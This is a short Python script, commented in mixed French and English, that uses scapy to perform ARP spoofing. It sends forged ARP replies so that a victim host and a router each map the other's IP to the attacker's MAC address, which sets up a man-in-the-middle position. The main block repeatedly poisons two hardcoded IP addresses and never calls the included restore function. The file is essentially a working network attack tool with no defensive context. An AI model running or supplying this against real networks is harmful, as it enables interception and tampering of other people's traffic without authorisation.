from scapy.all import *
import time

def get_mac(interface, ip):
    trame = Ether() / ARP()
    trame.pdst = ip
    ans, unans = srp(trame, iface=interface)
    ans = ans[0][1]
    return ans.hwsrc

def trick(interface, ip_victim, ip_router):
    trame_router = Ether() / ARP()
    trame_victim = Ether() / ARP()

    mac_victim = get_mac(interface, ip_victim)
    mac_router = get_mac(interface, ip_router)
   
    trame_router.op = "is-at"
    trame_router.dst = mac_router
    trame_router.hwdst = mac_router
    trame_router.pdst = ip_router
    # Par default, on a déjà our mac as source:
    # trame_router.src = bad_mac
    # trame_router.hwsrc = bad_mac
    trame_router.psrc = ip_victim

    trame_victim.op = "is-at"
    trame_victim.dst = mac_victim
    trame_victim.hwdst = mac_victim
    trame_victim.pdst = ip_victim
    # Par default, on a déjà our mac as source:
    # trame_router.src = bad_mac
    # trame_router.hwsrc = bad_mac
    trame_victim.psrc = ip_router

    sendp(trame_victim)
    sendp(trame_router)

def reARP(interface, ip_victim, ip_router):
    trame_router = Ether() / ARP()
    trame_victim = Ether() / ARP()

    mac_victim = get_mac(interface, ip_victim)
    mac_router = get_mac(interface, ip_router)
   
    trame_router.op = "is-at"
    trame_router.src = mac_victim
    trame_router.hwsrc = mac_victim
    trame_router.psrc = ip_victim
    trame_router.dst = mac_router
    trame_router.hwdst = mac_router
    trame_router.pdst = ip_router

    trame_victim.op = "is-at"
    trame_victim.src = mac_router
    trame_victim.hwsrc = mac_router
    trame_victim.psrc = ip_router
    trame_victim.dst = mac_victim
    trame_victim.hwdst = mac_victim
    trame_victim.pdst = ip_victim

    sendp(trame_victim)
    sendp(trame_router)

if __name__ == "__main__":
    for i in range(100):
        trick("eth0", "147.250.8.208", "147.250.9.245")
        time.sleep(5)